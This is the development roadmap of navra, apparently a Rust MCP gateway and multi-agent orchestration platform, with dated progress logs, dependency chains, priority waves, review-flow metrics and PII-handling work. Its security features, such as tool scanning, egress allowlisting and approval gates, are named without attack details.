# navra Roadmap

This document tracks the evolution of the navra-* crate family from
an MCP gateway (navra) into a complete multi-agent orchestration
platform.

## Current state (2026-06-01)

22 crates, ~125K LoC, 2400+ tests, 0 warnings. 43 personas, 36
heuristics, 8 directives. Gateway blackbox audit. 4 paper outlines.
Fully local multi-agent demos. Full PII pipeline (regex + NER + file
paths, pseudonymization, GDPR tools, IFC integration). Containerized
agent execution via Podman (shared model server + per-agent sandboxes).
Full MCP spec coverage (~39/39) + MCP 2026-07-28 runtime gate.
WebSocket transport. GitHub forge tools. Statistical guardrails +
cross-tool transition tracking. Context budget enforcement. Hybrid
FTS5+vector+HyDE RAG with 3-channel RRF fusion + agentic L2 multi-hop.
Upstream tool scanning (8 threat categories) + manifest signing.
Cognitive file integrity monitoring. Skill lifecycle with IFC labels.
Egress endpoint allowlist. Approval gate hook (OWASP 10/10).
Temporal tree memory (MemForest on SQLite, 3x write / 80x query).
ID-JAG agent registration. IFC declassification witness. Prometheus
/metrics + OTel trace export. Agentic OS primitives. vLLM backend
+ Engine×Isolation refactor (6 backends). 138 Kani formal proofs.

### Recent (2026-06-01)

- **Renamed smgglrs → navra**: Full project rename across 22 crates,
  3,600 files, all binaries/configs/URIs/metrics/docs. GitHub repo
  renamed to smgglrs-ai/navra. Sibling repos (rendra, rendra-ag-ui,
  rust-ai-stack) updated. Config path: `~/.config/navra/config.toml`,
  data path: `~/.local/share/navra/`.

### Recent (2026-05-29)

- **Waves 1-3 implemented** (20 items, ~150 new tests):
  - **Completions**: 9z (cedar counter), 9i (spec compliance tests),
    2m (kill switch + circuit breaker), 9w (cross-tool transition
    tracking), 1j (skill source pipeline)
  - **Wave 1**: 9u (egress allowlist, 12 tests), 9v (OWASP ASI
    mapping + 8 integration tests), 9x additive (MCP headers,
    ttlMs, trace context, deprecation), 7k (HyDE 3-channel RRF)
  - **Wave 2**: 9ab (tool manifest signing + TOFU, 10 tests),
    11k (IFC declassification witness, 8 tests), 8l (dynamic
    tool routing + IFCToolFilter), 7m (adaptive chunking metrics +
    document type detection), 9y (ID-JAG registration, 12 tests),
    9x gated (stateless dispatch + runtime config)
  - **Wave 3**: 9ac (approval gate hook — OWASP ASI09 closed),
    7c (agentic RAG L2 — query decomposition + self-correction),
    1k (MUSE skill lifecycle — registry, testing, IFC labels),
    3l (temporal tree memory on SQLite — intermediate levels,
    batch insert, benchmarked 3x write / 80x query at 10K)
- **OWASP ASI coverage**: 8/10 → 10/10 (9ab closes ASI04, 9ac
  closes ASI09)
- **MemForest architecture validated**: temporal tree on SQLite
  beats flat KnowledgeStore at all scales — batch writes 3.1x
  faster, range queries 80x faster (O(1) at 38µs vs O(N)),
  tested to 1M facts
- **MCP 2026-07-28**: runtime config gate (`mcp_version` in
  config.toml), both protocol versions compiled in, stateless
  dispatch via synthetic sessions keyed by agent identity
- **Phase 15 → rendra stack**: Servo-based desktop app replaces
  web UI, AG-UI events via rendra-ag-ui widget

### Recent (2026-05-28)

- **Tech watch** (31 items, 7 domains, 5 research agents): MCP
  2026-07-28 RC (largest breaking revision — sessions removed),
  Shadow Escape zero-click MCP attack, 3 IFC competitors (FIDES,
  MVAR, NeuroTaint), Microsoft AGT 7-package governance toolkit,
  K8s Agent Sandbox CRDs, auth.md agent registration protocol,
  TurboVec Rust vector index, MemForest temporal memory, MUSE
  skill lifecycle, Cloudflare 5-channel RRF (validates navra-rag),
  OWASP ASI 2026 taxonomy (navra covers 8/10)
- **New roadmap items**: Egress allowlist (9u), OWASP ASI mapping
  (9v), HyDE retrieval channel (7k), cross-tool anomaly detection
  (9w), MCP 2026-07-28 runtime-gated migration (9x),
  auth.md/ID-JAG (9y), TurboVec eval (7l), IFC cryptographic
  witness (11k), IFC adversarial benchmark (11l), NeuroTaint
  offline audit (11m), adaptive chunking metrics (7m), K8s
  sandbox backend (6i), MemForest temporal memory (3l), MUSE
  skill lifecycle (1k), Cedar policy eval (9z), dynamic tool
  routing (8l), kill switch (2m), MCP default flip (9aa),
  tool manifest signing (9ab), approval gate hook (9ac)
- **vLLM backend**: Engine×Isolation refactor — 6 backends
  (LlamaCpp/vLLM × direct/Podman/OpenShell), 42 tests
- **Kani proofs**: 23→138 across 14 crates, 7 waves

### Recent (2026-05-26)

- **Sprint 6 (Implementable now)**: 11 items resolved (5 already done,
    6 newly implemented: 9q, 7j, 9s, 9r, 12e, 2h)
- **Sprint 5 (Quick wins)**: 6 items implemented
  - **Phase 8j+8k**: Loop detection + reasoning sandwich in tool loop
  - **Phase 2k**: Per-agent temperature in flow YAML
  - **Phase 9o**: Gateway field filtering (FieldFilterHook)
  - **Phase 7i**: Section-level pointer retrieval
  - **Phase 1i**: Early commitment fast paths (task classification)
- **Sprint 4 (Depth)**: 3 substantial items implemented
  - **Phase 2e**: Event log — append-only SQLite log with sequence
    numbers, typed FlowEvent enum, divergence detection, backfill
    for SSE recovery. 8 new tests.
  - **Phase 9p**: HASP SkillHook — executable guardrails in hook
    pipeline (Block/ModifyArg/InjectContext/Noop interventions),
    tool+path pattern matching. 8 new tests.
  - **Phase 12f**: RAMPART safety test suite — 129 attack variants
    across 5 categories (injection, Unicode, desc injection, schema
    abuse, credentials) with statistical thresholds. 6 tests.
- **Sprint 3 (High priority)**: 4 of 5 items implemented
  - **Phase 7h**: Batch cross-encoder scoring — single ONNX inference
    for all candidates, 10x reranking speedup.
  - **Phase 6f**: MCP tunnel compatibility — documentation and
    architecture guide for Anthropic + OpenAI tunnels.
  - **Phase 1h**: Deterministic replay — recipe compilation from
    successful traces, file-backed store, word-overlap matching,
    template variable substitution. 9 new tests.
  - **Phase 2d**: Durable DAG execution — per-node checkpointing wired
    into executor, idempotency cache, atomic SQLite transactions,
    resume from checkpoint on restart. 4 new tests.
  - **Phase 12a**: Flow audit completeness — started_at bug fixed.
    7/8 gaps were already implemented.
- **Sprint 2 (High priority)**: 7 items (3 already done, 4 implemented)
  - **Phase 7a**: Cross-encoder reranking — already implemented ✅
  - **Phase 9k**: OBO identity claim — already implemented ✅
  - **Phase 9l**: RFC 8693 token exchange — already implemented ✅
  - **Phase 7f**: Breadcrumb injection — heading hierarchy prepended
    to chunks for positional awareness in embeddings. 5 new tests.
  - **Phase 7g**: Confidence gating — GatedReranker wrapper with
    mean-score threshold abstention. 4 new tests.
  - **Phase 2f**: Anti-propagation hop limits — max_hops on DagExecutor,
    per-agent message rate limiting on MailboxRegistry.
  - **Phase 2g**: Provenance headers — provenance chain on MailboxMessage
    and BlackboardEntry, circular provenance detection.
  - **Phase 12a**: Flow audit completeness — started_at bug fixed.
    7/8 gaps were already implemented.
- **Sprint 1 (P0 Critical)**: 4 items implemented in parallel worktrees
  - **Phase 7e**: Hybrid FTS5+vector search in ChunkStore with RRF
    fusion (k=60). Content-sync FTS5 table + triggers. 7 new tests.
  - **Phase 12c**: Prometheus `/metrics` endpoint (existing in
    streamable transport, 5 new security counters added). OTel trace
    export via `tracing-opentelemetry` (feature-gated `--features otel`).
    Structured `tool_call.start`/`tool_call.complete` tracing events.
  - **Phase 9m**: Upstream tool definition scanning — 8 threat
    categories (poisoning, typosquatting, schema abuse, hidden Unicode,
    description injection, cross-server refs, intent-behavior mismatch,
    rug pull). Wired into `UpstreamModule::discover()`. 14 new tests.
  - **Phase 9n**: Cognitive file integrity monitoring — SHA-256
    baselines + optional semantic drift detection via embeddings.
    Background `tokio::spawn` task (60s interval). Malicious/Suspicious/
    Benign classification. 8 new tests.
- **Phase 14 (Agentic OS completeness)**: All 5 items implemented
  - 14a: Agent signal (Interrupt/Terminate/Pause/Resume via watch channel)
  - 14b: Kernel state as MCP resources (`navra://proc`, `navra://ifc/labels`, etc.)
  - 14c: Resource list filtering by agent permissions
  - 14d: Agent process hibernation (conversation + optional KV cache)
  - 14e: Preemptive scheduling (`cancel()` on ModelBackend, per-agent token quotas)

### Recent (2026-05-25)

- **Tech watch** (40+ sources, 7 research agents): MCP security
  market exploding (97M monthly SDK downloads, 30 CVEs in 60 days),
  OpenShell+Claude self-hosted sandboxes validating navra position,
  RAG consensus shifting to hybrid FTS5+vector, agent frameworks
  converging on durable execution, competitive landscape intensifying
- **New competitors**: IBM ContextForge (strongest OSS gateway, 3500+
  stars, Cedar RBAC, A2A), ClawPatrol/Enkrypt AI (direct safety hook
  competitor), Envoy AI Gateway (MCPRoute v1beta1, AAIF/LF backing),
  DefenseClaw/Cisco (admission control + runtime guardrails)
- **Key papers**: NanoResearch (skill bank + SDPO), LIFE Framework
  (failure attribution), HASP Program Functions (25% over ReAct),
  delta-mem OSAM (0.12% working memory), SDB formalization
  (arXiv 2605.20173), Proxy-Pointer RAG (100% accuracy)
- **New roadmap items**: Upstream tool scanning (9m), cognitive file
  integrity (9n), hybrid RAG (7e), breadcrumb chunking (7f),
  confidence gating (7g), batch reranking (7h), section-level
  pointers (7i), RAG metadata filtering (7j), event log durable
  execution (2e), anti-propagation (2f), provenance headers (2g),
  SDB formalization (2h), trajectory branching (2i), self-verify
  gate (2j), deterministic replay (1h), early commitment (1i),
  gateway field filtering (9o), HASP skill hooks (9p), loop
  detection (8j), reasoning sandwich (8k), per-agent temperature
  (2k), response sanitization audit (9q), trust decay (9r),
  OTLP export (12c upgrade), risk-tiered approval (9s), MCP tunnel
  compat (6f), NemoClaw alternative design (6g), skill source
  pipeline (1j), HTML-to-markdown conversion (9t), KG triples (3k),
  operator libraries (2l), delta-mem evaluation (11i), harness-
  aligned training (11j)

### Recent (2026-05-17)

- **Tech watch** (15 articles, 7 research agents): GLiGuard 300M
  safety model (encoder-based, ONNX, Apache 2.0), Microsoft AGT
  competitor analysis, OTel GenAI semantic conventions for
  observability, Power of Attorney auth model (navra cap tokens
  are superset), cost-aware LLM routing (vLLM Semantic Router),
  prompt compression (ACON/LLMLingua-2), Memori agent memory
  (3D scoping), hybrid attention (Qwen3.5), ADK durable execution,
  12-metric evaluation framework
- **New roadmap items**: GLiGuard eval (11f), speculative decoding
  (11g), RoutingHook (11h), OTel observability upgrade (12c→HIGH),
  memory scoping (3i), durable DAG execution (2d), auth delegation
  chain (9k-9l), progressive tool disclosure (8i)

### Recent (2026-05-15)

- **MCP spec complete**: All 4 remaining method gaps implemented —
  completion/complete (prompt arg + resource URI suggestions),
  logging/setLevel (per-session log level filtering),
  resources/subscribe + unsubscribe (session-scoped subscription
  tracking with notifications/resources/updated delivery)
- **GitHub forge module** (navra-tools-github, 21st crate): 6
  tools via `gh` CLI (github_pr_list, github_pr_create,
  github_pr_view, github_issue_list, github_issue_create,
  github_issue_comment). Input validation, config wiring
- **WebSocket transport**: `/ws` endpoint alongside SSE. Axum
  built-in WS, authenticates on upgrade, dispatches through
  existing dispatch(), forwards SSE notifications per-session
- **Statistical guardrails**: Cosine drift detector (z-score on
  sliding window) + Shannon entropy monitor (tool call distribution).
  StatisticalGuardrailHook as post-hook, per-session state, optional
  blocking. 27 tests
- **Context budget enforcement**: BudgetHook post-hook with
  head+tail truncation strategy, line-boundary preservation,
  proportional multi-content distribution. 8 tests
- All tools migrated to `#[tool]` proc macro (completed 2026-05-15)
- Git remote operations: git_push, git_pull, git_fetch

### Recent (2026-05-07)

- Domain-agnostic review + improve flows with dynamic persona selection
- build_test MCP tool, task-level tool/operation grants in flow YAML
- Planner JSON resilience (markdown stripping, id-boundary recovery,
  schema enforcement on generates_tasks agents)
- response_format plumbed through ChatRequest → Ollama API
- Container agent stdout fix (skip log lines before JSON)
- Comparative flow evaluation: dynamic 3.5x more efficient than hardcoded
- Paper 3 outline with evaluation data
- Phase 12 added: observability + infrastructure debt (8 metrics gaps)
- ROADMAP audit: stale sections updated, items assigned to phases
- Tech watch: 5 articles (NVIDIA Vera Rubin, OpenAI PII filter,
  skill-based agents, systematic prompting, Vercel DeepSec)

### Recent (2026-05-06)

- Renamed navra-tools-docs → navra-tools-file (DocsModule→FileModule)
- WebMCP transport skeleton (feature-gated, CDP bridge pattern)
- Persona semantic validation (cross-reference checks + CLI subcommand)
- Working memory decay wired into turn selection (get_turns_by_score)
- Hermes-format trace export (JSONL with <think>/<tool_call>/<tool_response>)
- ROADMAP reprioritized with tech watch items (13 articles analyzed)

### Recent (2026-05-05)

- Phase 8a: Typed agent action/result model (AgentAction, RiskLevel)
- Phase 8b: MCP config import (Claude Desktop, VSCode, Codex formats)
- Phase 9a-9b: 14 MCP spec types (tool annotations, content variants,
  logging, sampling, completions, roots, progress, cancellation)
- Phase 9c: Cursor-based pagination for all list operations
- Phase 9d-9e: Notification infrastructure (notify/notify_session on
  McpServer, progress tracking via _meta.progressToken)
- Phase 9f: Stdio server transport (`navra stdio` for IDE integration)
- Phase 9g: OAuth 2.0 (provider, authenticator, HTTP endpoints wired)
- Phase 9h: navra-macros crate (`#[tool]` proc macro)
- Two self-review rounds (23+8 agents) with findings fixed
- Self-review findings: zombie process fix, port TOCTOU, pick_free_port
  dedup, git_diff ref fix, vision size limit, memory pagination, SSE
  RwLock, audience validation warnings

### Dependency graph & execution plan (2026-05-28)

All pending roadmap items organized by dependency chains, priority,
and parallelism. Items at the same depth in a chain can run in
parallel with items from other chains.

#### Legend

- **→** hard dependency (must complete first)
- **⇢** soft dependency (informs but doesn't block)
- **⏳** external gate (spec release, OSS availability, hardware)
- Priority: P0 = Critical, P1 = High, P2 = Medium-High, P3 = Medium

#### Chain 1: MCP protocol evolution (HIGH — incremental)

```
9x. MCP 2026-07-28 runtime-gated migration
    P1, additive 3-4d + gated 5-7d (weekly increments)
    │
    ├─ additive items ship immediately (both versions)
    │  Mcp-Method headers, ttlMs, Trace Context, deprecation warnings
    │
    ├─ gated items behind mcp_version = "2026-07-28"
    │  stateless dispatch, session-free IFC, Tasks extension, MCP Apps
    │
    └──→ 9aa. Default flip + cleanup
              P0, 3-5d, ⏳ July 28 final spec
```

9x is now incremental (weekly cadence), not a big-bang migration.
Additive items ship under both versions. Gated items are behind a
runtime config switch. 9aa is just flipping the default + agent
client update after the spec finalizes.

Parallel with 9x additive work:
- 8l (dynamic tool routing) benefits from Mcp-Method headers
- 9y (auth.md) aligns with the 6 OAuth hardening SEPs

#### Chain 2: Security hardening (HIGH — Shadow Escape defense)

```
                     ┌→ 9w. Cross-tool anomaly detection (P2, 2-3d)
9u. Egress allowlist ┤
    P1, 2-3d         └⇢ 11m. NeuroTaint offline audit (P3, 5-7d)
                              ↑
9v. OWASP ASI mapping ─⇢ 11l. IFC adversarial benchmark
    P1, 2-3d                  P3, 3-5d, ⏳ corpus availability

11k. IFC crypto witness ─⇢ 11l. IFC adversarial benchmark
     P2, 2-3d                   ↓
                           11m. NeuroTaint offline audit
                                P3, 5-7d
```

9u and 9v are independent P1 items — start immediately.
9w builds on 9u's egress patterns. 11k/11l/11m form the IFC
competitive positioning chain (benchmarking against FIDES/MVAR/
NeuroTaint). 11l is gated on public corpus availability.

#### Chain 3: Auth & policy (MEDIUM-HIGH)

```
9y. auth.md / ID-JAG ──── (independent)
    P2, 3-4d

9z. Cedar policy ──── (independent)
    P3, 3-4d

U2. GitHub module ──→ U3. GitLab ──→ U4. Jira
    P1, 3-4d    │     P2, 3-4d       P3, 2-3d
                ├──→ U5. Permission patterns (P1, 1d)
                │         ↓
                │    U7. Policy engine sidecar (P3, 3-4d)
                └──→ U6. GraphQL scope escape (P1, 1-2d)
```

9y and 9z are independent of each other and of the U-chain.
The U-chain (platform tools) has U2 as the foundation — U3-U7
all depend on patterns established in U2. U8 (K8s config reload)
is independent.

#### Chain 4: RAG pipeline (MEDIUM)

```
7k. HyDE channel ──── (independent, P3, 1-2d)

7l. TurboVec eval ──── (independent, P3, 2-3d)
    ⇢ if adopted, replaces sqlite-vec in 7b/7c

7m. Adaptive chunking ──── (independent, P3, 2-3d)

7b. Semantic query caching (P1, 3-5d)
7c. Agentic RAG L2 (P1, 3-5d)
    both depend on 7a ✅

7d. Nomic Embed eval (P2, 2d)
```

All RAG items are independent of each other. 7k, 7l, 7m are new;
7b, 7c are existing high-priority items. Can run any combination
in parallel. 7l results inform whether to proceed with TurboVec
replacement or stay with sqlite-vec.

#### Chain 5: Memory architecture (MEDIUM)

```
3b. Memory type classification ──── (independent, design complete)

3k. KG triple storage ──── depends on 3j ✅
    P3, 2-3d

3l. MemForest temporal memory ──── (independent)
    P3, 7-10d, ⏳ OSS release
```

3l is the largest memory item. Independent of 3k. Both can
proceed in parallel. 3l is gated on MemForest's open-source
release availability.

#### Chain 6: Cognitive & skills (MEDIUM)

```
1j. Skill source pipeline ──→ 1k. MUSE skill lifecycle
    P3, 2-3d                      P3, 5-7d

1d. Lazy-loading specializations ──── (independent, P3)
1g. Negative constraints ──── (independent, P3)
```

1k depends on 1j (skill pipeline must exist before lifecycle
management). 1d and 1g are small independent items.

#### Chain 7: Flow orchestration (MEDIUM)

```
2m. Kill switch + circuit breaker ──── (independent, P3, 2-3d)

2l. Operator libraries ──── (independent, P3, 0.5-1d)

2a. YAML flow definitions ──── (design complete, needs impl)
```

All independent. 2m is new (tech watch), 2l and 2a are existing.

#### Chain 8: Isolation & deployment (MEDIUM)

```
6i. K8s Agent Sandbox ──── (independent)
    P3, 3-5d, ⏳ v1alpha1 stability

6g. NemoClaw MCP bridge ──── (independent, P3, 1d)
6h. Privacy Router ──── (independent, P3, 1d)

U8. K8s-friendly config reload (P2, 1-2d)
```

6i is new (tech watch). All independent — can run in any order.

#### Chain 9: Model & safety research (MEDIUM — gated)

```
11a. ONNX/ort deepening ──⇢ 11b. KAME voice
     P3, research              P3, research
     ⏳ ONNX spec              ⏳ Moshi ONNX export

11d. PII ONNX classifier ──── (independent, P3, 2-3d)

11g. Speculative decoding ──── (independent, P3, 2-3d)
     ⏳ OpenVINO 2026.1 EAGLE3

11i. delta-mem OSAM eval ──── (independent, P3, 2d)
     ⏳ ONNX integration

11j. Harness-aligned training ──── (independent, P3, research)

11c. Adversarial safety eval ──── (independent, P3, 3-5d)

11e. Statistical guardrails ──── already impl'd ✅ (verify)
```

Most Phase 11 items are research-gated and independent. They
can be picked up opportunistically when gates clear.

#### Chain 10: Papers (blocks on code + eval)

```
13a. Critical fixes ──→ 10a. Security paper
     ~3d total      │   ↑
                    │   ├── 11l (IFC benchmark results)
                    │   ├── 11k (crypto witness for claims)
                    │   └── 9v (OWASP mapping for framing)
                    │
                    ├─→ 10b. Persona paper
                    │   ↑
                    │   └── 1k (skill lifecycle for contribution)
                    │
                    └─→ 10c. Review paper
                        ↑
                        └── C3 (external eval, 3-5d)

13b. Significant fixes ──⇢ all papers (weakens if skipped)
13c. Missing related work ──⇢ all papers (bibliography)
13d. Restructuring decisions ──⇢ all papers (scope)
```

Papers are the terminal node for many chains. 10a benefits from
11k, 11l, 9v results. 10b benefits from 1k. 10c needs C3
external evaluation.

#### Chain 11: Rendra desktop app (MEDIUM — independent track)

```
15a. Agentic chat (rendra) ──→ 15e. Embeddable widget (rendra-ag-ui)
     P1, 3-4d                       P3, 2-3d

15b. Live dashboard (rendra) ──→ 15c. DAG visualization
     P1, 2-3d                        P3, 2-3d

15d. Branding ──── (independent, P3, 1-2d)
```

15a and 15b are parallel P1 items. Built on rendra stack (Servo
runtime + rendra-ui + rendra-ag-ui). Completely independent of
navra Rust work — can be worked on anytime. Note: rendra apps
are separate repos (smgglrs-ai/rendra, rendra-ui, rendra-ag-ui).

#### Chain 12: UX & tool patterns (MEDIUM)

```
8l. Dynamic tool routing ──── (independent, P3, 2-3d)

8c. Config schema gen (P3, 1d)
8d. Computer use Actor (P2, 2d)
8g. Intent-based tool grouping (P2, 2-3d) ─⇢ 8l
8h. Multi-hypothesis routing (P3, 1-2d)
8f. ToolBlock output (P2, 1d)

5h. Upstream prompt injection ──── (independent)
5i. Module trait taxonomy ──── (independent, P3, 3-5d)
```

8g and 8l are related (both about tool selection) — do 8g first,
8l extends it with IFC-gated filtering. Others are independent.

#### Chain 13: OWASP full coverage (MEDIUM — differentiators)

```
9ab. Tool manifest signing ──── (independent, P2, 2-3d)
     Closes ASI04 gap → 9/10 coverage

9ac. Approval gate hook ──→ 5e. AG-UI rendering
     P3, 3-4d                P3, 2-3d
     Closes ASI09 gap        AG-UI confirmation widgets
     → 10/10 coverage        for approval requests

     Both depend on 15a/15b (Web UI) for rendering,
     but work headless (auto-deny on timeout).
```

9ab and 9ac are navra differentiators — neither MCP nor AG-UI
provides enforcement. Together they close the remaining OWASP gaps
(8/10 → 10/10).

#### Chain 14: Ecosystem integration (LOW — opportunistic)

```
5b. MCP permission negotiation ──── (AAIF contribution)
5d. LLM backend expansion ──── (independent)
5f. Registry proxy ──── (independent)
5g. Cross-validation in flows ──── (independent)
9i. Spec compliance test suite ✅
9j. WebSocket agentic loops (P2, 2-3d)
9t. HTML-to-markdown (P3, 1d)
```

Mostly independent, lower priority.

---

#### Execution plan: priority-sorted waves

```
WAVE 1 — ✅ COMPLETE (2026-05-29)
══════════════════════════════════
  9u  Egress allowlist       ✅  12 tests
  9v  OWASP ASI mapping      ✅  8 integration tests, docs
  9w  Cross-tool anomaly     ✅  transition tracker, 3 tests
  9x  MCP additive           ✅  headers, ttlMs, trace context
  7k  HyDE channel           ✅  3-channel RRF, 3 tests
  9i  Spec compliance        ✅  9 dispatch tests
  U8  K8s config reload      ✅  (was already done)

WAVE 2 — ✅ MOSTLY COMPLETE (2026-05-29)
════════════════════════════════════════
  9x  MCP stateless dispatch ✅  runtime config gate
  9y  auth.md/ID-JAG         ✅  12 tests
  9z  Cedar policy           ✅  (was already ~done, counter wired)
  9ab Tool manifest signing  ✅  TOFU + Ed25519, 10 tests
  11k IFC crypto witness     ✅  DeclassificationWitness, 8 tests
  8l  Dynamic tool routing   ✅  ToolFilter + IFCToolFilter, 3 tests
  7m  Adaptive chunking      ✅  ChunkQuality + DocumentType, 6 tests
  2m  Kill switch            ✅  circuit breaker, 3 tests
  1j  Skill pipeline         ✅  SkillSource + SkillPipeline, 4 tests
  7b  Semantic caching       ✅  (was already done)

  Remaining:
  11l IFC adversarial bench  ⏳  gated on corpus availability
  7l  TurboVec eval          —   evaluation, no blocker

WAVE 3 — ✅ MOSTLY COMPLETE (2026-05-29)
════════════════════════════════════════
  3l  Temporal tree memory   ✅  intermediate levels, batch insert,
                                 benchmarked 3x write / 80x query
  1k  MUSE skill lifecycle   ✅  registry, testing, IFC labels, 15 tests
  7c  Agentic RAG L2         ✅  query decomposition, self-correction, 10 tests
  9ac Approval gate hook     ✅  Pending variant, approve/deny, 8 tests

  Remaining:
  U3  GitLab module          —   port of U2 pattern
  6i  K8s sandbox            ⏳  gated on v1alpha1 stability
  11m NeuroTaint audit       ⏳  depends on 11l
  5e  AG-UI event layer      —   depends on rendra-ag-ui
  15a/15b Rendra app         —   separate repos

WAVE 4 — Gated (external dependencies)
══════════════════════════════════════
  9aa  MCP default flip   P0   ⏳ July 28 spec (3-5d)
  11a  ONNX/ort deepening P3   ⏳ ONNX spec
  11b  KAME voice          P3   ⏳ Moshi ONNX
  11g  Speculative decoding ✅  (was already done)
  11i  delta-mem OSAM      P3   ⏳ ONNX integration

WAVE 5 — Papers (terminal)
══════════════════════════
  13a  Critical paper fixes     ~3d
  10a  Security paper           depends on 11k ✅, 11l, 9v ✅
  10b  Persona paper            depends on 1k ✅
  10c  Review paper             depends on C3 (3-5d eval)

NEXT ACTIONS (value-driven, 2026-06-01):

  The code is ahead of the evidence. Prove what's built before
  building more. Everything not on this list is parking lot.

  Tier 1 — Prove the claims (June–July):
  1. 11n model-runtime refactor  High 1-2d (tech debt, unblocks backends)
  2. 13a Paper critical fixes    P1   3d   (FIDES diff, gateway positioning)
  3. C3  External eval (3+ OSS)  P1   3-5d (statistical significance)
  4. 10a Security paper          P1   5-7d (flagship, most deps resolved)

  Tier 2 — Close gaps (July–August):
  5. 9aa MCP default flip        P0   3-5d (⏳ gated on July 28 spec)
  6. U3  GitLab module           P2   3-4d (enterprise reach)
  7. 15a+15b Rendra app MVP      P1   5-7d (demo-able UX, separate repos)

  Tier 3 — Ecosystem (Q3–Q4):
  8. First external deployment
  9. Community docs + getting started guide
  10. 10b Persona paper
```

#### Critical paths (updated 2026-05-29)

```
1. MCP migration:
   9x additive ✅ + gated ✅ → 9aa flip ⏳ July 28  = DONE except flip
   Only the default flip remains, gated on final spec.

2. IFC competitive positioning:
   11k ✅ → 11l (5d, ⏳ corpus) → 11m (7d) → 10a   = 12d remaining
   11l is the bottleneck — gated on MVAR/TaintBench availability.

3. Cognitive skills:
   1j ✅ → 1k ✅ → 10b                              = DONE, paper ready

4. Shadow Escape defense:
   9u ✅ → 9w ✅ → 9ac ✅                            = COMPLETE

5. Papers:
   13a (3d) → 10a (5-7d)                            = 8-10d
   Most code dependencies resolved. 11l results would strengthen
   10a but aren't blocking — can publish with label-only IFC
   benchmarks and note semantic taint as future work.
```

#### Parking lot (LOW priority, no urgency)

These items have no dependencies on them and can wait:

| ID | Item | Priority | Effort |
|----|------|----------|--------|
| 1d | Lazy-loading specializations | Low | — |
| 1g | Negative constraints | Low | — |
| 2l | Operator libraries | Low | 0.5-1d |
| 3k | KG triple storage | Low-Med | 2-3d |
| 5b-5g | Ecosystem integration batch | Various | — |
| 8c | Config schema gen | Med | 1d |
| 8f | ToolBlock output | Med-High | 1d |
| 8h | Multi-hypothesis routing | Low | 1-2d |
| 9t | HTML-to-markdown | Low-Med | 1d |
| 11j | Harness-aligned training | Med | research |
| 15d | Branding | Low | 1-2d |
| 15e | Embeddable widget | Low-Med | 2-3d |

### Infrastructure (complete)

| Crate | Status | What it does |
|-------|--------|-------------|
| navra-protocol | Done (Phase 9) | MCP/A2A types, upstream client (stdio/HTTP/SSE + retry). 39/39 MCP spec features. |
| navra-model | Done | ModelBackend trait, ONNX (in-process), OpenAI-compat, Anthropic (direct + Vertex AI) |
| navra-model-hub | Done | Pull/cache models from OCI, HuggingFace, Ollama registries. Composite model cards (vendor + agentic + runtime) |
| navra-model-runtime | Done | Serve models via llama-server or Podman. libkrun delegated to OpenShell (see OPENSHELL.md) |
| navra-security | Done | Auth (BLAKE3, capability tokens, DID:key), ACLs, IFC with trusted paths, safety filters, hooks |
| navra-core | Done | MCP server, module trait, session, IFC value store, transport |
| navra-server | Done | Gateway binary (navra), config, model hub/runtime integration, CLI |

### Client & Orchestration (v1 complete)

| Crate | Status | What it does |
|-------|--------|-------------|
| navra-agent | Done | Client SDK: Agent builder with `.persona()`, McpClient with taint tracking, ReAct tool-use loop, non-progress iterations, scoped capability tokens. Standalone binary (`navra-agent`) for containerized execution + `Dockerfile.agent` |
| navra-flow | Done (v2) | Multi-agent flows: handoff routing, DAG execution, mesh communication (mailbox, blackboard, back-edges), IFC-gated, mandate validation |

### Tools & Modalities (scaffolded)

| Crate | Status | What it does |
|-------|--------|-------------|
| navra-tools-file | Done | File CRUD, FTS5, sqlite-vec (renamed from navra-tools-docs 2026-05-06) |
| navra-tools-git | Done | Git status, diff, log, branch, commit |
| navra-rag | Done | Vector search, semantic chunking |
| navra-modal-voice | Scaffolded | ASR + TTS via ONNX (Whisper, Piper) |
| navra-modal-vision | Scaffolded | Image understanding (GPU tier) |

---

## Review and improvement flows

The framework reviews and improves projects through its own gateway
using DAG-based multi-agent flows. Four flow templates are available:

| Flow | Persona selection | Use case |
|------|------------------|----------|
| `comprehensive-review.yaml` | Hardcoded (5 personas) | Baseline code review |
| `review.yaml` | Dynamic (scout classifies → planner picks) | Domain-agnostic review |
| `self-improve.yaml` | Hardcoded | Code improvement cycle |
| `improve.yaml` | Dynamic | Domain-agnostic improvement |

### Running

```bash
# Start the server
navra serve

# Run a review via MCP (from any MCP client)
flow_start(flow_name="review", prompt="Review the project",
  parameters={"target_dir": "/path/to/project"})

# Or use the hardcoded variant
flow_start(flow_name="comprehensive-review", ...)

# Improvement cycle (creates git worktree for isolation)
navra improve --target . --cycles 3 --branch self-improve
```

### Comparative results (2026-05-07)

| Metric | Hardcoded | Dynamic | Ratio |
|--------|-----------|---------|-------|
| Wall clock | 32 min | 21 min | 0.66x |
| Total tokens | 3.77M | 1.78M | 0.47x |
| Specialists | 23 | 14 | — |
| Precision (real findings) | 37.5% | 62.5% | 1.67x |
| False positive rate | 25% | 12.5% | 0.50x |
| Real findings / M tokens | 0.80 | 2.81 | 3.5x |
| Cost per real finding | 1.26M tok | 0.36M tok | 3.5x cheaper |

Dynamic persona selection dominates: better quality at lower cost.
The planner picks personas that match the project domain rather
than spreading evenly across hardcoded categories.

### Audit metrics (current state)

**Captured in audit.db:**
- `flow_results`: per-task output, specialist, model, tokens
  (cumulative), started_at, completed_at
- `flow_metadata`: YAML content, parameters, flow-level timing
- `audit_runs`: per-agent run metadata
- `audit_tool_calls`: schema exists but **not populated** for
  flow agents (Phase 12a)
- `audit_model_calls`: schema exists but **not populated** for
  flow agents (Phase 12a)

**Known metrics gaps** (see Phase 12):
- Per-task duration always 0 (started_at == completed_at)
- Per-task iteration count always NULL
- Per-task tokens are cumulative, not per-agent
- Model name stored as "auto" instead of resolved name
- No GPU utilization recording

---

## PII handling (completed 2026-04-25)

### Original gaps (all resolved) ✅

1. ✅ **Fix false positives** — timestamp/UUID negative lookaheads
   in phone and pattern regexes
2. ✅ **Add EU PII patterns** — NIR, IBAN, SIRET/SIREN, EU phone,
   IP addresses, passport numbers
3. ✅ **Filter on memory ingestion** — PII filter runs on
   KnowledgeStore::store and distillation output
4. ✅ **Redact audit logs** — blackbox entries pass through the
   safety pipeline before persistence
5. ✅ **PII as IFC label** — `Confidentiality::Pii` above Sensitive;
   tool results containing PII auto-label; IFC blocks writes to
   non-PII-safe destinations
6. ✅ **Data retention / purge** — `memory_purge_pii` tool,
   configurable retention TTL, PII scan on existing data

### Additional PII work completed ✅

| Feature | Detail |
|---------|--------|
